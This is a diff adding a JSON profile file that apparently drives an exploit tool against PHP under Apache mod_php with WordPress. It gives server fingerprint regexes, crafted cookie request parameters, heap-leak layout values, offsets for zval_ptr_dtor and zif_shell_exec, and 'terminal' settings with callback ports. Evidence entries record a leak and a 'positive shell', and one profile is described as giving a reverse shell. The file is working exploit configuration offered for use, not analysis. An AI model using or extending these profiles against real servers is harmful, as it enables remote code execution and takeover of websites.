@@ -1,0 +1,243 @@
+{
+  "schema": "q618-auto-profiles-v2",
+  "profiles": [
+    {
+      "id": "php854-ubuntu22-wp713-prefork5-fanchor-v1",
+      "status": "READY",
+      "capabilities": {
+        "leak": "READY",
+        "terminal": "READY"
+      },
+      "scope": "exact-lab-profile",
+      "portability_status": "HOLD",
+      "non_default_dependencies": [
+        "module_sha256:698f61af8921af6977f51c44d03a76a2e6946696f1473b5915ebf8a2ddb2b8ae",
+        "apache_prefork_worker_count:5",
+        "session_save_path_length:37"
+      ],
+      "priority": 100,
+      "implementation": "php854-fanchor-v1",
+      "selection_signature": "6a8999d5edbee73cc40e4112c53390e24b3216a0756d709d07919e5be8da3bcd",
+      "description": "PHP 8.5.4 x86_64 mod_php, Ubuntu 22.04 Apache 2.4.52 prefork-five, production limits, stock-cwd FANCHOR leak",
+      "architecture": "x86_64",
+      "sapi": "apache2handler",
+      "module_sha256": "698f61af8921af6977f51c44d03a76a2e6946696f1473b5915ebf8a2ddb2b8ae",
+      "worker_count": 5,
+      "fingerprint": {
+        "method": "OPTIONS",
+        "path": "*",
+        "allowed_statuses": [200],
+        "server_regex": "^Apache(?:/2\\.4\\.52(?:[ (]|$)|$)",
+        "php_regex": "^PHP/8\\.5\\.4(?:[ -]|$)",
+        "missing_php_header": "candidate_only"
+      },
+      "runtime": {
+        "wordpress": "7.1.3",
+        "cwd": "/",
+        "display_errors": "Off",
+        "html_errors": "Off",
+        "memory_limit_bytes": 134217728,
+        "post_max_size_bytes": 8388608,
+        "upload_max_filesize_bytes": 2097152,
+        "max_input_vars": 1000,
+        "max_file_uploads": 20,
+        "session_save_handler": "files",
+        "session_save_path_length": 37,
+        "session_use_cookies": 1,
+        "session_use_strict_mode": 0,
+        "session_upload_progress_enabled": 1
+      },
+      "requests": {
+        "a1": {
+          "body": "stock-cwd-fanchor-evidence/b1-1792849868-20769/a1.body.bin",
+          "sha256": "86eca256db7159dbe0d18f85f587a1e729d378dd9d1e6feb5f568261a856b48a",
+          "boundary": "q618-cookie-a1-boundary",
+          "cookie": "%00",
+          "path": "/index.php",
+          "allowed_statuses": [500]
+        },
+        "b1": {
+          "body": "stock-cwd-fanchor-evidence/b1-1792849868-20769/b1.body.bin",
+          "sha256": "5d5c54544b7884e3dd54ef787acb7a0ffc6d19080d47cf32e7be03eddbee41c7",
+          "boundary": "q618-cookie-b1-boundary",
+          "cookie": "a",
+          "path": "/wp-content/index.php",
+          "allowed_statuses": [200]
+        }
+      },
+      "leak": {
+        "cookie_length": 512,
+        "cookie_prefix_hex": "2f42315441472121",
+        "hash_table_offset": 80,
+        "hash_table_count": 7,
+        "hash_table_stride": 56,
+        "hash_table_header": [1, 7, 20, 4294967294],
+        "hash_table_shape": [1, 1, 8, 0, 1]
+      },
+      "offsets": {
+        "zval_ptr_dtor": "0x74c6f0",
+        "zif_shell_exec": "0x535400",
+        "terminal_backing": "0x63140"
+      },
+      "terminal": {
+        "request_path": "/index.php",
+        "prime_path": "/index.php",
+        "prime_allowed_statuses": [200, 301, 302, 500],
+        "health_path": "/wp-content/index.php",
+        "health_allowed_statuses": [200],
+        "boundary": "q618-cookie-terminal-boundary",
+        "fillers": 905,
+        "callback_port_min": 1,
+        "callback_port_max": 9,
+        "command_max_bytes": 39
+      },
+      "evidence": {
+        "safe_control": "stock-terminal-evidence/exact-safe-pass-1792850487-32736/receipt.json",
+        "positive_shell": "stock-terminal-evidence/exact-positive-shell-1792850547-45768/receipt.json",
+        "verifier": "stock-terminal-evidence/verify_stock_full_chain.py"
+      }
+    },
+    {
+      "id": "php8335-official-wp712-prefork150-fanchor-v1",
+      "status": "READY",
+      "capabilities": {
+        "leak": "READY",
+        "terminal": "READY"
+      },
+      "scope": "exact-official-image-profile",
+      "portability_status": "READY",
+      "non_default_dependencies": [
+        "image_digest:wordpress@sha256:4abf7a450ee477dde967584f8174d7e03221d224c4971a0c38d84e7254426e64",
+        "module_sha256:212564d66bb2d475b1ba1ed8495bee79be06980332e2c1de777138ff6312bc33",
+        "apache_prefork_worker_count:150"
+      ],
+      "priority": 90,
+      "implementation": "php8335-fanchor-v1",
+      "selection_signature": "4a7aa41b84c8f7b91361da66d5519d9a73d5ffd1648bd2489f13f8ed9bd965db",
+      "description": "Official WordPress 7.1.2 PHP 8.3.35 Apache image, stock prefork-150, HTTP-derived FANCHOR leak and reverse shell",
+      "architecture": "x86_64",
+      "sapi": "apache2handler",
+      "image": "wordpress:7.1.2-php8.3-apache",
+      "image_digest": "wordpress@sha256:4abf7a450ee477dde967584f8174d7e03221d224c4971a0c38d84e7254426e64",
+      "module_sha256": "212564d66bb2d475b1ba1ed8495bee79be06980332e2c1de777138ff6312bc33",
+      "module_build_id": "0f83b051a4c7a6ae888edfbc8c4c16e4a35231e0",
+      "worker_count": 150,
+      "fingerprint": {
+        "method": "OPTIONS",
+        "path": "*",
+        "allowed_statuses": [200],
+        "server_regex": "^Apache/2\\.4\\.68(?:[ (]|$)",
+        "php_regex": "^PHP/8\\.3\\.35(?:[ -]|$)",
+        "missing_php_header": "candidate_only"
+      },
+      "runtime": {
+        "wordpress": "7.1.2",
+        "cwd": "/var/www/html",
+        "display_errors": "Off",
+        "html_errors": "Off",
+        "memory_limit_bytes": 134217728,
+        "post_max_size_bytes": 8388608,
+        "upload_max_filesize_bytes": 2097152,
+        "max_input_vars": 1000,
+        "max_file_uploads": 20,
+        "session_save_handler": "files",
+        "session_save_path_length": 0,
+        "session_use_cookies": 1,
+        "session_use_strict_mode": 0,
+        "session_upload_progress_enabled": 1
+      },
+      "requests": {
+        "a1": {
+          "body": "official-php8335-leak-evidence/a1.body.bin",
+          "sha256": "9b1a85686efa015b637b321560c229c0b4eb77f2d9b54d4bb7d6efca43711c96",
+          "boundary": "q618-cookie-a1-boundary",
+          "cookie": "%00",
+          "path": "/index.php",
+          "allowed_statuses": [500]
+        },
+        "b1": {
+          "body": "official-php8335-leak-evidence/b1.body.bin",
+          "sha256": "07934f1b5d9720be77cfb29f3c7c29bf6750dc9d54062816f348c2896475baef",
+          "boundary": "q618-cookie-b1-boundary",
+          "cookie": "a",
+          "path": "/wp-content/index.php",
+          "allowed_statuses": [200]
+        }
+      },
+      "leak": {
+        "cookie_length": 512,
+        "cookie_prefix_hex": "2f42315441472121",
+        "hash_table_offset": 80,
+        "hash_table_count": 7,
+        "hash_table_stride": 56,
+        "hash_table_header": [1, 7, 20, 4294967294],
+        "hash_table_shape": [1, 1, 8, 0, 1],
+        "main_chunk_alignment": 2097152,
+        "module_alignment": 4096,
+        "ar_data_stride": 160,
+        "require_pointers_absent_from_requests": true
+      },
+      "offsets": {
+        "zval_ptr_dtor": "0x49ec50",
+        "zif_shell_exec": "0x3ac740",
+        "terminal_backing": "0x65140"
+      },
+      "terminal": {
+        "request_path": "/index.php",
+        "prime_path": "/index.php",
+        "prime_allowed_statuses": [200, 301, 302, 500],
+        "health_path": "/wp-content/index.php",
+        "health_allowed_statuses": [200],
+        "boundary": "q618-cookie-terminal-boundary",
+        "fillers": 905,
+        "callback_port_min": 1,
+        "callback_port_max": 9,
+        "command_max_bytes": 39,
+        "refresh_lane_after_a1": true,
+        "refresh_lane_after_b1": true,
+        "safe_type_hex": "0100",
+        "positive_type_hex": "0703",
+        "normalized_positive_seed_sha256": "2af81b3a70d5db3ba0060a471c7ce1f8b4537996f99fe566a26b39511b2ff5e7",
+        "safe_terminal_statuses": [500]
+      },
+      "health": {
+        "path": "/wp-content/index.php",
+        "allowed_statuses": [200]
+      },
+      "evidence": {
+        "leak_positive": "official-php8335-leak-evidence/positive.receipt.json",
+        "positive_cookie": "official-php8335-leak-evidence/positive.cookie.bin",
+        "fixed_control": "official-php8335-leak-evidence/fixed-8336.receipt.json",
+        "fixed_cookie": "official-php8335-leak-evidence/fixed-8336.cookie.bin",
+        "no_progress_control": "official-php8335-leak-evidence/no-progress.receipt.json",
+        "no_progress_cookie": "official-php8335-leak-evidence/no-progress.cookie.bin",
+        "source_verification": "official-php8335-leak-evidence/source-verification.json",
+        "checksums": "official-php8335-leak-evidence/SHA256SUMS.txt",
+        "offline_verifier": "verify_php8335_leak_profile.py",
+        "safe_control": "official-php8335-terminal-evidence/safe.receipt.json",
+        "safe_control_record": "official-php8335-terminal-evidence/safe.control.json",
+        "positive_shell": "official-php8335-terminal-evidence/positive.receipt.json",
+        "positive_control_record": "official-php8335-terminal-evidence/positive.control.json",
+        "shell_transcript": "official-php8335-terminal-evidence/session.raw",
+        "verifier": "verify_php8335_terminal_profile.py",
+        "sha256": {
+          "leak_positive": "35d8a2dd8a8909033d805145e9b2f6e349502abbdee1d258485e54aa1f24b87b",
+          "positive_cookie": "79ef44a847022b5f4f900390f1785247232b26847a3ac50c45d53ee1d90108ed",
+          "fixed_control": "2348f0930d43c3f60ceaa0d29b22d1ed392e1b2f101bb0779a54cf9f482da4d5",
+          "fixed_cookie": "085a56abc9f127eec5a77e9e64af4799d6d185632e43dab07785f391b8f028be",
+          "no_progress_control": "eca5e034d7abe1428ea901c5b2ca20f36c5e199e8eef7d26cfeace38f310eb79",
+          "no_progress_cookie": "02fb546971d46a4015debcf3bc27c51e1d9c250205294166ba2c396d1398c7d0",
+          "source_verification": "f2e053129e7ab8e23d36d5ff85c2e6d7f383aa427dad5dbb5de56c6b50a35002",
+          "checksums": "19b9c36ac070c0a6a59cb807e1c24f5906d2d3b96aa4b1db3441b290529fc2b6",
+          "offline_verifier": "b53d7d9c46b5b2f2f130e1722ebe1379b1f09886c851d32a5ad560fc6d7c7796",
+          "safe_control": "fde99ef257aa52d355402c69fc72779337718236935dc9876c0d5167eb340432",
+          "safe_control_record": "5d8a79fc8363620ce0744c989e84e27e6c0eb9450a160936c0cb4478a6d83395",
+          "positive_shell": "bd1166cfaa827655c35932307c9a10a7e5715891fdfee29b4357eaf7a09e1568",
+          "positive_control_record": "7d684d206ff03393b89fd8a16a1d15ea3ebf21c8d083e5970e339c3158e7827f",
+          "shell_transcript": "dc869a80cd7c3150b2962de87c5fdc5e4d898add36ec8851846c5e7c4eccc624",
+          "verifier": "95b344417cdf686771330f623ce403986225c9f8943480d0effccc823f8faedc"
+        }
+      }
+    }
+  ]
+}
